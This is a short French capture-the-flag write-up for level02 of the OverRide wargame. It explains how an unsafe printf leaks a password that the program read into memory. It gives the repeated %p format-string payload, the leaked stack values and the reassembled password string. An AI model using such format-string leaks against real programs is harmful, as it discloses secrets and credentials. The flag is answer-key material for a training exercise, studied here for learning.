En lisant le code, on peut se rendre compte de plusieurs choses.

- Un read vient lire le contenu d'un fichier contenant le mot de passe.
- Un printf est utilisé quelque sinstructions plus tard.

La présence de ce printf nous permettra d'exploiter l'utilisation de printf afin de pouvoir afficher ce qui est lu en mémoire, comme par exemple le
contenu de notre read().

On peux taper %p pour afficher les pointeurs contenus dans le programme grâce à l'utilisation de ce printf non sécurisé.
Lorsque le programme nous demande de taper notre login, on va spammer les %p pour afficher ce qui est contenu en mémoire dans notre programme, ce qui donne le résultat suivant:

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

756e505234376848 (unPR47hH)
45414a3561733951 (EAJ5as9Q)
377a7143574e6758 (7zqCWNgX)
354a35686e475873 (5J5hnGXs)
48336750664b394d (H3gPfK9M)

Soluce: on lit les var à l'envers et on reverse (little endian)

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
